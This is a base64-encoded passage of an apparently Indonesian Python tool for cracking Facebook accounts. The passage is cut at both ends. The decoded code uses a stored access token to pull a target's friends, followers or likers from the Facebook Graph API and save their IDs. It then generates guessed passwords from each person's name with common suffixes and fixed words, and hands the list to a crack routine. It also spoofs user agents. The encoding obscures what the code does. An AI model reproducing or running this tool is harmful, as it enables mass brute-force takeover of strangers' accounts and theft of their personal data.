inaXilIFbJXMhJXNdICVzU2VlIHlvdSBsYXRlciclKE8sUCxPLFApKQ0KICAgICAgICBvcy5zeXN0ZW0oJ3JtIC1yZiB0b2tlbi50eHQnKQ0KICAgICAgICBtZW51X2xvZygpDQogICAgZWxzZToNCiAgICAgICAgamFsYW4oJyVz4p2l4pSBWyVzISVzXSAlc0lzaSBZYW5nIEJlbmFyJyUoTSxQLE0sUCkpDQogICAgICAgIG1lbnUoKQ0KZGVmIGRlZmF1bHR1YSgpOg0KICAgIHVhID0gdWFfbm9raWENCiAgICB0cnk6DQogICAgICAgIHVnZW50ID0gb3BlbigndWdlbnQudHh0JywndycpDQogICAgICAgIHVnZW50LndyaXRlKHVhKQ0KICAgICAgICB1Z2VudC5jbG9zZSgpDQogICAgZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKToNCiAgICAgICAgbWVudV9sb2coKQ0KZGVmIHVnZW4oKToNCiAgICB2YXJfdWdlbigpDQogICAgcG11ID0gaW5wdXQoJyVz4p2l4pSBWyVz4oCiJXNdICVzQ2hvb3NlIDogJyUoTyxQLE8sUCkpDQogICAgcHJpbnQoJyVz4p2l4pSBJyUoTykpDQogICAgaWYgcG11IGluWyIiXToNCiAgICAgICAgamFsYW4oJyVz4p2l4pSBWyVzISVzXSAlc0lzaSBZYW5nIEJlbmFyJyUoTSxQLE0sUCkpDQogICAgICAgIG1lbnUoKQ0KICAgIGVsaWYgcG11IGluIFsnMScsJzAxJywnMDAxJywnYSddOg0KICAgICAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vc2VhcmNoP3E9TXkrVXNlcitBZ2VudCZvcT1NeStVc2VyK0FnZW50JmFxcz1jaHJvbWUuLjY5aTU3ajBsM2owaTIyaTMwbDYuNDY3NGowajEmc291cmNlaWQ9Y2hyb21lJmllPVVURi04JykNCiAgICAgICAgaW5wdXQoJyVz4p2l4pSBWyAlc0JhY2sgJXNdJXMnJShPLFAsTyxQKSkNCiAgICAgICAgbWVudSgpDQogICAgZWxpZiBwbXUgaW4gWycyJywnMDInLCcwMDInLCdiJ106DQogICAgICAgIG9zLnN5c3RlbSgicm0gLXJmIHVnZW50LnR4dCIpDQogICAgICAgIHVhID0gaW5wdXQoIiVz4p2l4pSBWyVz4oCiJXNdICVzRW50ZXIgVXNlciBBZ2VudCA6IFxuXG4iJShPLFAsTyxQKSkNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgdWdlbnQgPSBvcGVuKCd1Z2VudC50eHQnLCd3JykNCiAgICAgICAgICAgIHVnZW50LndyaXRlKHVhKQ0KICAgICAgICAgICAgdWdlbnQuY2xvc2UoKQ0KICAgICAgICAgICAgamFsYW4oIlxuJXPinaXilIFbICVzU3VjY2VzZnVsbHkgQ2hhbmdlZCBVc2VyIEFnZW50ICVzXSIlKE8sUCxPKSkNCiAgICAgICAgICAgIHByaW50KCclc+KdpeKUgSclKE8pKQ0KICAgICAgICAgICAgaW5wdXQoJyVz4p2l4pSBWyAlc1JldHVybiAlc10lcyclKE8sUCxPLFApKQ0KICAgICAgICAgICAgbWVudSgpDQogICAgICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6DQogICAgICAgICAgICBqYWxhbigiXG4lc+KdpeKUgVsgJXNGYWlsZWQgdG8gQ2hhbmdlIFVzZXIgQWdlbnQgJXNdIiUoTSxQLE0pKQ0KICAgICAgICAgICAgcHJpbnQoJyVz4p2l4pSBJyUoTSkpDQogICAgICAgICAgICBpbnB1dCgnJXPinaXilIFbICVzQmFjayAlc10lcyclKE0sUCxNLFApKQ0KICAgICAgICAgICAgbWVudSgpDQogICAgZWxpZiBwbXUgaW4gWyczJywnMDMnLCcwMDMnLCdjJ106DQogICAgICAgIHVnZW5faHAoKQ0KICAgIGVsaWYgcG11IGluIFsnNCcsJzA0JywnMDA0JywnZCddOg0KICAgICAgICBvcy5zeXN0ZW0oInJtIC1yZiB1Z2VudC50eHQiKQ0KICAgICAgICBqYWxhbigiJXPinaXilIFbICVzVXNlciBBZ2VudCBEZWxldGVkIFN1Y2Nlc3NmdWxseSAlc10iJShPLFAsTykpDQogICAgICAgIHByaW50KCclc+KdpeKUgSclKE8pKQ0KICAgICAgICBpbnB1dCgnJXPinaXilIFbICVzUmV0dXJuICVzXSVzJyUoTyxQLE8sUCkpDQogICAgICAgIG1lbnUoKQ0KICAgIGVsaWYgcG11IGluIFsnNScsJzA1JywnMDA1JywnZSddOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICB1bmdzZXIgPSBvcGVuKCd1Z2VudC50eHQnLCAncicpLnJlYWQoKQ0KICAgICAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOg0KICAgICAgICAgICAgdW5nc2VyID0gJ05vdCBGb3VuZCcNCiAgICAgICAgcHJpbnQoIiVz4p2l4pSBWyVz4oCiJXNdICVzWW91ciBVc2VyIEFnZW50ICA6IFxuXG4lcyVzIiUoTyxQLE8sUCxPLHVuZ3NlcikpDQogICAgICAgIGphbGFuKCJcbiVz4p2l4pSBWyAlc1RoaXMgaXMgeW91ciBjdXJyZW50IHVzZXIgYWdlbnQgJXNdIiUoTyxQLE8pKQ0KICAgICAgICBwcmludCgnJXPinaXilIEnJShPKSkNCiAgICAgICAgaW5wdXQoJyVz4p2l4pSBWyAlc1JldHVybiAlc10lcyclKE8sUCxPLFApKQ0KICAgICAgICBtZW51KCkNCiAgICBlbGlmIHBtdSBpbiBbJzAnLCcwMCcsJzAwMCcsJ2YnXToNCiAgICAgICAgbWVudSgpDQogICAgZWxzZToNCiAgICAgICAgamFsYW4oJyVz4p2l4pSBWyVzISVzXSAlc0lzaSBZYW5nIEJlbmFyJyUoTSxQLE0sUCkpDQpkZWYgdWdlbl9ocCgpOg0KICAgIG9zLnN5c3RlbSgicm0gLXJmIHVnZW50LnR4dCIpDQogICAgcHJpbnQoJyVz4p2l4pSBWyVzMSVzXSAlc1hpYW9taSclKE8sUCxPLFApKQ0KICAgIHByaW50KCclc+KdpeKUgVslczIlc10gJXNOb2tpYSclKE8sUCxPLFApKQ0KICAgIHByaW50KCclc+KdpeKUgVslczMlc10gJXNBc3VzJyUoTyxQLE8sUCkpDQogICAgcHJpbnQoJyVz4p2l4pSBWyVzNCVzXSAlc0h1YXdlaSclKE8sUCxPLFApKQ0KICAgIHByaW50KCclc+KdpeKUgVslczUlc10gJXNWaXZvJyUoTyxQLE8sUCkpDQogICAgcHJpbnQoJyVz4p2l4pSBWyVzNiVzXSAlc09wcG8nJShPLFAsTyxQKSkNCiAgICBwcmludCgnJXPinaXilIFbJXM3JXNdICVzU2Ftc3VuZyclKE8sUCxPLFApKQ0KICAgIHByaW50KCclc+KdpeKUgVslczglc10gJXNXaW5kb3dzJyUoTyxQLE8sUCkpDQogICAgcGMgPSBpbnB1dCgnJXPinaXilIFbJXPigKIlc10gJXNDaG9vc2UgOiAnJShPLFAsTyxQKSkNCiAgICBwcmludCgnJXPinaXilIEnJShPKSkNCiAgICBpZiBwYyBpblsnJ106amFsYW4oJyVz4p2l4pSBWyVzISVzXSAlc0lzaSBZYW5nIEJlbmFyJyUoTSxQLE0sUCkpO21lbnUoKQ0KICAgIGVsaWYgcGMgaW4gWycxJywnMDEnXToNCiAgICAgICAgdWdlbnQgPSBvcGVuKCd1Z2VudC50eHQnLCd3Jyk7dWdlbnQud3JpdGUodWFfeGlhb21pKTt1Z2VudC5jbG9zZSgpDQogICAgZWxpZiBwYyBpbiBbJzInLCcwMiddOg0KICAgICAgICB1Z2VudCA9IG9wZW4oJ3VnZW50LnR4dCcsJ3cnKTt1Z2VudC53cml0ZSh1YV9ub2tpYSk7dWdlbnQuY2xvc2UoKQ0KICAgIGVsaWYgcGMgaW4gWyczJywnMDMnXToNCiAgICAgICAgdWdlbnQgPSBvcGVuKCd1Z2VudC50eHQnLCd3Jyk7dWdlbnQud3JpdGUodWFfYXN1cyk7dWdlbnQuY2xvc2UoKQ0KICAgIGVsaWYgcGMgaW4gWyc0JywnMDQnXToNCiAgICAgICAgdWdlbnQgPSBvcGVuKCd1Z2VudC50eHQnLCd3Jyk7dWdlbnQud3JpdGUodWFfaHVhd2VpKTt1Z2VudC5jbG9zZSgpDQogICAgZWxpZiBwYyBpbiBbJzUnLCcwNSddOg0KICAgICAgICB1Z2VudCA9IG9wZW4oJ3VnZW50LnR4dCcsJ3cnKTt1Z2VudC53cml0ZSh1YV92aXZvKTt1Z2VudC5jbG9zZSgpDQogICAgZWxpZiBwYyBpbiBbJzYnLCcwNiddOg0KICAgICAgICB1Z2VudCA9IG9wZW4oJ3VnZW50LnR4dCcsJ3cnKTt1Z2VudC53cml0ZSh1YV9vcHBvKTt1Z2VudC5jbG9zZSgpDQogICAgZWxpZiBwYyBpbiBbJzcnLCcwNyddOg0KICAgICAgICB1Z2VudCA9IG9wZW4oJ3VnZW50LnR4dCcsJ3cnKTt1Z2VudC53cml0ZSh1YV9zYW1zdW5nKTt1Z2VudC5jbG9zZSgpDQogICAgZWxpZiBwYyBpbiBbJzgnLCcwOCddOg0KICAgICAgICB1Z2VudCA9IG9wZW4oJ3VnZW50LnR4dCcsJ3cnKTt1Z2VudC53cml0ZSh1YV93aW5kb3dzKTt1Z2VudC5jbG9zZSgpDQogICAgZWxzZTpqYWxhbignJXPilZrilZDilZBbJXMhJXNdICVzSXNpIFlhbmcgQmVuYXInJShNLFAsTSxQKSk7bWVudSgpDQogICAgamFsYW4oIiVz4p2l4pSBWyAlc1N1Y2Nlc3NmdWxseSBDaGFuZ2VkIFVzZXIgQWdlbnQgJXNdIiUoTyxQLE8pKQ0KICAgIHByaW50KCclc+KVkSclKE8pKQ0KICAgIGlucHV0KCclc+KdpeKUgVsgJXNCYWNrICVzXSVzJyUoTyxQLE8sUCkpDQogICAgbWVudSgpDQpkZWYgcHVibGlrKCk6DQogICAgdHJ5Og0KICAgICAgICBsaXNlbnNpID0gb3BlbigibGljZW5zZS50eHQiLCJyIikucmVhZCgpDQogICAgICAgIHdsID0gcmVxdWVzdHMuZ2V0KHVybF9saWNlbnNlICsgbGlzZW5zaSkNCiAgICAgICAgd2sgPSBqc29uLmxvYWRzKHdsLnRleHQpDQogICAgICAgIHdqID0gd2tbJ3VzZXJuYW1lJ10NCiAgICAgICAgamlkID0gJzUwMDAnDQogICAgZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKToNCiAgICAgICAgamlkID0gJzUwMDAnDQogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KICAgICAgICBqYWxhbignJXPinaXilIFbJXMhJXNdICVzQ29ubmVjdGlvbiBQcm9ibGVtJyUoTSxQLE0sUCkpDQogICAgICAgIGV4aXQoKQ0KICAgIHRyeToNCiAgICAgICAgdG9rZW4gPSBvcGVuKCJ0b2tlbi50eHQiLCJyIikucmVhZCgpDQogICAgICAgIHggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0iICsgdG9rZW4pDQogICAgICAgIHkgPSBqc29uLmxvYWRzKHgudGV4dCkNCiAgICAgICAgbiA9IHlbJ25hbWUnXQ0KICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6DQogICAgICAgIGphbGFuKCclc+KdpeKUgVslc1JhbmElc10gJXNUb2tlbi9Db29raWVzIEludmFsaWQnJShNLFAsTSxQKSkNCiAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgdG9rZW4udHh0JykNCiAgICAgICAgbWVudV9sb2coKQ0KICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoNCiAgICAgICAgamFsYW4oJyVz4p2l4pSBWyVzISVzXSAlc0Nvbm5lY3Rpb24gUHJvYmxlbSclKE0sUCxNLFApKQ0KICAgICAgICBleGl0KCkNCiAgICB0cnk6DQogICAgICAgIHByaW50KCclc+KdpeKUgVslc+KAoiVzXSAlc0lOUFVUIElEJyUoTyxQLE8sUCkpDQogICAgICAgIGl0ID0gaW5wdXQoIiVz4p2l4pSBWyVzUmFuYSVzXSAlc0lEIFRhcmdldCA6ICIlKE8sUCxPLFApKQ0KICAgICAgICB0cnk6DQogICAgICAgICAgICBwYiA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIiArIGl0ICsgIj9hY2Nlc3NfdG9rZW49IiArIHRva2VuKQ0KICAgICAgICAgICAgb2IgPSBqc29uLmxvYWRzKHBiLnRleHQpDQogICAgICAgICAgICBwcmludCAoJyVz4p2l4pSBWyVz4oCiJXNdICVzTmFtZSA6ICVzJyUoTyxQLE8sUCxvYlsnbmFtZSddKSkNCiAgICAgICAgZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKToNCiAgICAgICAgICAgIHByaW50KCclc+KdpeKUgSclKE8pKQ0KICAgICAgICAgICAgamFsYW4oJyVz4p2l4pSBWyVzUmFuYSVzXSAlc0lEIE5vdCBGb3VuZCclKE0sUCxNLFApKQ0KICAgICAgICAgICAgbWVudSgpDQogICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzL2ZyaWVuZHM/bGltaXQ9JXMmYWNjZXNzX3Rva2VuPSVzIiUoaXQsamlkLHRva2VuKSkNCiAgICAgICAgaWQgPSBbXQ0KICAgICAgICB6ID0ganNvbi5sb2FkcyhyLnRleHQpDQogICAgICAgIHhjID0gKG9iWyJmaXJzdF9uYW1lIl0rIi5qc29uIikucmVwbGFjZSgiICIsIl8iKQ0KICAgICAgICB4YiA9IG9wZW4oeGMsInciKQ0KICAgICAgICBmb3IgYSBpbiB6WyJkYXRhIl06DQogICAgICAgICAgICBpZC5hcHBlbmQoYVsiaWQiXSsi4oCiIithWyJuYW1lIl0pDQogICAgICAgICAgICB4Yi53cml0ZShhWyJpZCJdKyLigKIiK2FbIm5hbWUiXSsiXG4iKQ0KICAgICAgICB4Yi5jbG9zZSgpDQogICAgICAgIHByaW50KCclc+KdpeKUgVslc+KAoiVzXSAlc1RvdGFsIElEIDogJXMnJShPLFAsTyxQLGxlbihpZCkpKQ0KICAgICAgICByZXR1cm4gY3JhY2soeGMpDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICBleGl0KCclc+KdpeKUgVslcyElc10gJXNFcnJvciA6ICVzJyUoTSxQLE0sUCxlKSkNCmRlZiBwZW5naWt1dCgpOg0KICAgIHRyeToNCiAgICAgICAgbGlzZW5zaSA9IG9wZW4oImxpY2Vuc2UudHh0IiwiciIpLnJlYWQoKQ0KICAgICAgICB3bCA9IHJlcXVlc3RzLmdldCh1cmxfbGljZW5zZSArIGxpc2Vuc2kpDQogICAgICAgIHdrID0ganNvbi5sb2Fkcyh3bC50ZXh0KQ0KICAgICAgICB3aiA9IHdrWyd1c2VybmFtZSddDQogICAgICAgIGppZCA9ICcxMDAwMCcNCiAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOg0KICAgICAgICBqaWQgPSAnNTAwMCcNCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQogICAgICAgIGphbGFuKCclc+KdpeKUgVslcyElc10gJXNDb25uZWN0aW9uIFByb2JsZW0nJShNLFAsTSxQKSkNCiAgICAgICAgZXhpdCgpDQogICAgdHJ5Og0KICAgICAgICB0b2tlbiA9IG9wZW4oInRva2VuLnR4dCIsInIiKS5yZWFkKCkNCiAgICAgICAgeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWU/YWNjZXNzX3Rva2VuPSIgKyB0b2tlbikNCiAgICAgICAgeSA9IGpzb24ubG9hZHMoeC50ZXh0KQ0KICAgICAgICBuID0geVsnbmFtZSddDQogICAgZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKToNCiAgICAgICAgamFsYW4oJyVz4p2l4pSBWyVzISVzXSAlc1Rva2VuL0Nvb2tpZXMgSW52YWxpZCclKE0sUCxNLFApKQ0KICAgICAgICBvcy5zeXN0ZW0oJ3JtIC1yZiB0b2tlbi50eHQnKQ0KICAgICAgICBtZW51X2xvZygpDQogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KICAgICAgICBqYWxhbignJXPinaXilIFbJXMhJXNdICVzQ29ubmVjdGlvbiBQcm9ibGVtJyUoTSxQLE0sUCkpDQogICAgICAgIGV4aXQoKQ0KICAgIHRyeToNCiAgICAgICAgcHJpbnQoJyVz4p2l4pSBWyVz4oCiJXNdICVzSW5wdXQgSUQgJyUoTyxQLE8sUCkpDQogICAgICAgIGl0ID0gaW5wdXQoIiVz4p2l4pSBWyVz4oCiJXNdICVzSUQgVGFyZ2V0IDogIiUoTyxQLE8sUCkpDQogICAgICAgIHRyeToNCiAgICAgICAgICAgIHBiID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iICsgaXQgKyAiP2FjY2Vzc190b2tlbj0iICsgdG9rZW4pDQogICAgICAgICAgICBvYiA9IGpzb24ubG9hZHMocGIudGV4dCkNCiAgICAgICAgICAgIHByaW50ICgnJXPinaXilIFbJXPigKIlc10gJXNOYW1lIDogJXMnJShPLFAsTyxQLG9iWyduYW1lJ10pKQ0KICAgICAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOg0KICAgICAgICAgICAgcHJpbnQoJyVz4pWRJyUoTykpDQogICAgICAgICAgICBqYWxhbignJXPinaXilIFbJXMhJXNdICVzSUQgTm90IEZvdW5kJyUoTSxQLE0sUCkpDQogICAgICAgICAgICBtZW51KCkNCiAgICAgICAgciA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvc3Vic2NyaWJlcnM/bGltaXQ9JXMmYWNjZXNzX3Rva2VuPSVzIiUoaXQsamlkLHRva2VuKSkNCiAgICAgICAgaWQgPSBbXQ0KICAgICAgICB6ID0ganNvbi5sb2FkcyhyLnRleHQpDQogICAgICAgIHhjID0gKG9iWyJmaXJzdF9uYW1lIl0rIi5qc29uIikucmVwbGFjZSgiICIsIl8iKQ0KICAgICAgICB4YiA9IG9wZW4oeGMsInciKQ0KICAgICAgICBmb3IgYSBpbiB6WyJkYXRhIl06DQogICAgICAgICAgICBpZC5hcHBlbmQoYVsiaWQiXSsi4oCiIithWyJuYW1lIl0pDQogICAgICAgICAgICB4Yi53cml0ZShhWyJpZCJdKyLigKIiK2FbIm5hbWUiXSsiXG4iKQ0KICAgICAgICB4Yi5jbG9zZSgpDQogICAgICAgIHByaW50KCclc+KdpeKUgVslc+KAoiVzXSAlc1RvdGFsIElEIDogJXMnJShPLFAsTyxQLGxlbihpZCkpKQ0KICAgICAgICByZXR1cm4gY3JhY2soeGMpDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICBleGl0KCclc+KdpeKUgVslcyElc10gJXNFcnJvciA6ICVzJyUoTSxQLE0sUCxlKSkNCmRlZiBsaWtlcnMoKToNCiAgICB0cnk6DQogICAgICAgIGxpc2Vuc2kgPSBvcGVuKCJsaWNlbnNlLnR4dCIsInIiKS5yZWFkKCkNCiAgICAgICAgd2wgPSByZXF1ZXN0cy5nZXQodXJsX2xpY2Vuc2UgKyBsaXNlbnNpKQ0KICAgICAgICB3ayA9IGpzb24ubG9hZHMod2wudGV4dCkNCiAgICAgICAgd2ogPSB3a1sndXNlcm5hbWUnXQ0KICAgICAgICBqaWQgPSAnMTAwMDAnDQogICAgZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKToNCiAgICAgICAgamlkID0gJzUwMDAnDQogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KICAgICAgICBqYWxhbignJXPinaXilIFbJXMhJXNdICVzQ29ubmVjdGlvbiBQcm9ibGVtJyUoTSxQLE0sUCkpDQogICAgICAgIGV4aXQoKQ0KICAgIHRyeToNCiAgICAgICAgdG9rZW4gPSBvcGVuKCJ0b2tlbi50eHQiLCJyIikucmVhZCgpDQogICAgICAgIHggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0iICsgdG9rZW4pDQogICAgICAgIHkgPSBqc29uLmxvYWRzKHgudGV4dCkNCiAgICAgICAgbiA9IHlbJ25hbWUnXQ0KICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6DQogICAgICAgIGphbGFuKCclc+KdpeKUgVslcyElc10gJXNUb2tlbi9Db29raWVzIEludmFsaWQnJShNLFAsTSxQKSkNCiAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgdG9rZW4udHh0JykNCiAgICAgICAgbWVudV9sb2coKQ0KICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoNCiAgICAgICAgamFsYW4oJyVz4p2l4pSBWyVzISVzXSAlc0Nvbm5lY3Rpb24gUHJvYmxlbSclKE0sUCxNLFApKQ0KICAgICAgICBleGl0KCkNCiAgICB0cnk6DQogICAgICAgIHByaW50KCclc+KdpeKUgVslc+KAoiVzXSAlc0lOUFVUIElEJyUoTyxQLE8sUCkpDQogICAgICAgIGl0ID0gaW5wdXQoIiVz4p2l4pSBWyVz4oCiJXNdICVzSUQgVGFyZ2V0IDogIiUoTyxQLE8sUCkpDQogICAgICAgIHRyeToNCiAgICAgICAgICAgIHBiID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iICsgaXQgKyAiP2FjY2Vzc190b2tlbj0iICsgdG9rZW4pDQogICAgICAgICAgICBvYiA9IGpzb24ubG9hZHMocGIudGV4dCkNCiAgICAgICAgICAgIHByaW50ICgnJXPinaXilIFbJXPigKIlc10gJXNOYW1lIDogJXMnJShPLFAsTyxQLG9iWyduYW1lJ10pKQ0KICAgICAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOg0KICAgICAgICAgICAgcHJpbnQoJyVz4pWRJyUoTykpDQogICAgICAgICAgICBqYWxhbignJXPinaXilIFbJXMhJXNdICVzSUQgTm90IEZvdW5kJyUoTSxQLE0sUCkpDQogICAgICAgICAgICBtZW51KCkNCiAgICAgICAgciA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvbGlrZXM/bGltaXQ9JXMmYWNjZXNzX3Rva2VuPSVzIiUoaXQsamlkLHRva2VuKSkNCiAgICAgICAgaWQgPSBbXQ0KICAgICAgICB6ID0ganNvbi5sb2FkcyhyLnRleHQpDQogICAgICAgIHhjID0gKG9iWyJmaXJzdF9uYW1lIl0rIi5qc29uIikucmVwbGFjZSgiICIsIl8iKQ0KICAgICAgICB4YiA9IG9wZW4oeGMsInciKQ0KICAgICAgICBmb3IgYSBpbiB6WyJkYXRhIl06DQogICAgICAgICAgICBpZC5hcHBlbmQoYVsiaWQiXSsi4oCiIithWyJuYW1lIl0pDQogICAgICAgICAgICB4Yi53cml0ZShhWyJpZCJdKyLigKIiK2FbIm5hbWUiXSsiXG4iKQ0KICAgICAgICB4Yi5jbG9zZSgpDQogICAgICAgIHByaW50KCclc+KdpeKUgVslc+KAoiVzXSAlc1RvdGFsIElEIDogJXMnJShPLFAsTyxQLGxlbihpZCkpKQ0KICAgICAgICByZXR1cm4gY3JhY2soeGMpDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICBleGl0KCclc+KdpeKUgVslcyElc10gJXNFcnJvciA6ICVzJyUoTSxQLE0sUCxlKSkNCmRlZiBnZW5lcmF0ZTEoX2NpY2lfKToNCiAgICBfZGFwdW50YV89W10NCiAgICBmb3IgaSBpbiBfY2ljaV8uc3BsaXQoIiAiKToNCiAgICAgICAgaWYgbGVuKGkpPDM6DQogICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgaT1pLmxvd2VyKCkNCiAgICAgICAgICAgIGlmIGxlbihpKT09MyBvciBsZW4oaSk9PTQgb3IgbGVuKGkpPT01Og0KICAgICAgICAgICAgICAgIF9kYXB1bnRhXy5hcHBlbmQoaSsiMTIzIikNCiAgICAgICAgICAgICAgICBfZGFwdW50YV8uYXBwZW5kKGkrIjEyMzQ1IikNCiAgICAgICAgICAgICAgICBfZGFwdW50YV8uYXBwZW5kKGkrIjEyMzQiKQ0KICAgICAgICAgICAgICAgIF9kYXB1bnRhXy5hcHBlbmQoaSsiNzg2IikNCiAgICAgICAgICAgICAgICBfZGFwdW50YV8uYXBwZW5kKGkrIjExMjIiKQ0KICAgICAgICAgICAgZWxpZiBsZW4oaSk+PTY6DQogICAgICAgICAgICAgICAgX2RhcHVudGFfLmFwcGVuZChpKQ0KICAgICAgICAgICAgICAgIF9kYXB1bnRhXy5hcHBlbmQoaSsiMTIzIikNCiAgICAgICAgICAgICAgICBfZGFwdW50YV8uYXBwZW5kKGkrIjEyMzQ1IikNCiAgICAgICAgICAgICAgICBfZGFwdW50YV8uYXBwZW5kKGkrIjEyMzQiKQ0KICAgICAgICAgICAgICAgIF9kYXB1bnRhXy5hcHBlbmQoaSsiNzg2IikNCiAgICAgICAgICAgICAgICBfZGFwdW50YV8uYXBwZW5kKGkrIjExMjIiKQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgIF9kYXB1bnRhXy5hcHBlbmQoX2NpY2lfLmxvd2VyKCkpDQogICAgcmV0dXJuIF9kYXB1bnRhXw0KZGVmIGdlbmVyYXRlMihfY2ljaV8pOg0KICAgIF9kYXB1bnRhXz1bXQ0KICAgIGZvciBpIGluIF9jaWNpXy5zcGxpdCgiICIpOg0KICAgICAgICBpZiBsZW4oaSk8MzoNCiAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBpPWkubG93ZXIoKQ0KICAgICAgICAgICAgaWYgbGVuKGkpPT0zIG9yIGxlbihpKT09NCBvciBsZW4oaSk9PTU6DQogICAgICAgICAgICAgICAgX2RhcHVudGFfLmFwcGVuZChpKyIxMjMiKQ0KICAgICAgICAgICAgICAgIF9kYXB1bnRhXy5hcHBlbmQoaSsiMTIzNDUiKQ0KICAgICAgICAgICAgICAgIF9kYXB1bnRhXy5hcHBlbmQoaSsiMTIzNCIpDQogICAgICAgICAgICAgICAgX2RhcHVudGFfLmFwcGVuZChpKyIxMTIyIikNCiAgICAgICAgICAgICAgICBfZGFwdW50YV8uYXBwZW5kKGkrIjc4NiIpDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIF9kYXB1bnRhXy5hcHBlbmQoaSkNCiAgICAgICAgICAgICAgICBfZGFwdW50YV8uYXBwZW5kKGkrIjEyMyIpDQogICAgICAgICAgICAgICAgX2RhcHVudGFfLmFwcGVuZChpKyIxMjM0NSIpDQogICAgICAgICAgICAgICAgX2RhcHVudGFfLmFwcGVuZChpKyIxMjM0IikNCiAgICAgICAgICAgICAgICBfZGFwdW50YV8uYXBwZW5kKGkrIjExMjIiKQ0KICAgICAgICAgICAgICAgIF9kYXB1bnRhXy5hcHBlbmQoaSsiNzg2IikNCiAgICBfZGFwdW50YV8uYXBwZW5kKF9jaWNpXy5sb3dlcigpKQ0KICAgIF9kYXB1bnRhXy5hcHBlbmQoInBha2lzdGFuIikNCiAgICBfZGFwdW50YV8uYXBwZW5kKCI3ODY3ODYiKQ0KICAgIF9kYXB1bnRhXy5hcHBlbmQoImtoYW5raGFuIikNCiAgICByZXR1cm4gX2RhcHVudGFfDQpkZWYgZ2VuZXJhdGUzKF9jaWNpXyk6DQogICAgX2RhcHVudGFfPVtdDQogICAgZm9yIGkgaW4gX2NpY2lfLnNwbGl0KCIgIik6DQogICAgICAgIGlmIGxlbihpKTwzOg0KICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGk9aS5sb3dlcigpDQogICAgICAgICAgICBpZiBsZW4oaSk9PTMgb3IgbGVuKGkpPT00IG9yIGxlbihpKT09NToNCiAgICAgICAgICAgICAgICBfZGFwdW50YV8uYXBwZW5kKGkrIjEyMyIpDQogICAgICAgICAgICAgICAgX2RhcHVudGFfLmFwcGVuZChpKyIxMjM0NSIpDQogICAgICAgICAgICAgICAgX2RhcHVudGFfLmFwcGVuZChpKyIxMjM0IikNCiAgICAgICAgICAgICAgICBfZGFwdW50YV8uYXBwZW5kKGkrIjExMjIiKQ0KICAgICAgICAgICAgICAgIF9kYXB1bnRhXy5hcHBlbmQoaSsiNzg2IikNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgX2RhcHVudGFfLmFwcGVuZChpKQ0KICAgICAgICAgICAgICAgIF9kYXB1bnRhXy5hcHBlbmQoaSsiMTIzIikNCiAgICAgICAgICAgICAgICBfZGFwdW50YV8uYXBwZW5kKGkrIjEyMzQ1IikNCiAgICAgICAgICAgICAgICBfZGFwdW50YV8uYXBwZW5kKGkrIjEyMzQiKQ0KICAgICAgICAgICAgICAgIF9kYXB1bnRhXy5hcHBlbmQoaSsiMTEyMiIpDQogICAgICAgICAgICAgICAgX2RhcHVudGFfLmFwcGVuZChpKyI3ODYiKQ0KICAgIF9kYXB1bnRhXy5hcHBlbmQoX2NpY2lfLmxvd2V